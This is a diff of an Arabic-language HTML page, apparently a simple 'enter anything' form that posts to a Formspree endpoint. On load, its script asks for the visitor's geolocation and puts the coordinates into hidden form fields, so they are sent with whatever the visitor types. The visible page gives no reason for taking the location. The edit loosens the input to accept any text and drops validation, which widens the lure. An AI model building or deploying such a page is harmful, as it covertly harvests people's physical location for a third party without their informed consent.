@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>إرسال بيانات البريد والموقع</title>
+  <title>إرسال بيانات المستخدم</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -17,13 +17,13 @@
       flex-direction: column;
     }
     form {
-      background: rgba(0,0,0,0.4);
+      background: rgba(0, 0, 0, 0.4);
       padding: 25px;
       border-radius: 10px;
       width: 320px;
       text-align: center;
     }
-    input[type="email"] {
+    input[type="text"] {
       width: 100%;
       padding: 10px;
       margin-bottom: 15px;
@@ -41,10 +41,6 @@
       font-size: 16px;
       cursor: pointer;
     }
-    button:disabled {
-      background-color: #7f8c8d;
-      cursor: not-allowed;
-    }
     .message {
       margin-top: 15px;
       font-size: 14px;
@@ -54,10 +50,9 @@
 </head>
 <body>
 
-  <form id="dataForm" action="https://formspree.io/f/xzzvzzkk" method="POST">
-    <h2>أدخل بريدك الإلكتروني</h2>
-    <input type="email" name="email" id="email" placeholder="example@email.com" required />
-    <!-- حقول الموقع الجغرافي مخفية -->
+  <form id="dataForm" action="https://formspree.io/f/xzzvzzkk" method="POST" novalidate>
+    <h2>أدخل أي شيء</h2>
+    <input type="text" name="contact" id="email" placeholder="اكتب هنا أي شيء (بريد أو نص...)" />
     <input type="hidden" name="latitude" id="latitude" />
     <input type="hidden" name="longitude" id="longitude" />
     <button type="submit">إرسال البيانات</button>
@@ -68,7 +63,7 @@
     const form = document.getElementById('dataForm');
     const messageDiv = document.getElementById('message');
 
-    // طلب الموقع الجغرافي عند تحميل الصفحة
+    // طلب الموقع الجغرافي
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         position => {
@@ -76,7 +71,6 @@
           document.getElementById('longitude').value = position.coords.longitude.toFixed(6);
         },
         error => {
-          // لو رفض المستخدم المشاركة أو حدث خطأ، نترك الحقول فارغة
           console.warn('لم يتم الحصول على الموقع:', error.message);
         }
       );
@@ -84,7 +78,7 @@
       console.warn('المتصفح لا يدعم الموقع الجغرافي');
     }
 
-    // التعامل مع إرسال الفورم
+    // إرسال البيانات
     form.addEventListener('submit', e => {
       e.preventDefault();
       messageDiv.textContent = 'جارٍ إرسال البيانات...';
@@ -101,15 +95,6 @@
           messageDiv.style.color = '#2ecc71';
           messageDiv.textContent = 'تم إرسال البيانات بنجاح!';
           form.reset();
-          // إعادة طلب الموقع بعد الإرسال تحضيراً لإرسال جديد
-          if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-              pos => {
-                document.getElementById('latitude').value = pos.coords.latitude.toFixed(6);
-                document.getElementById('longitude').value = pos.coords.longitude.toFixed(6);
-              }
-            );
-          }
         } else {
           throw new Error('فشل في إرسال البيانات');
         }
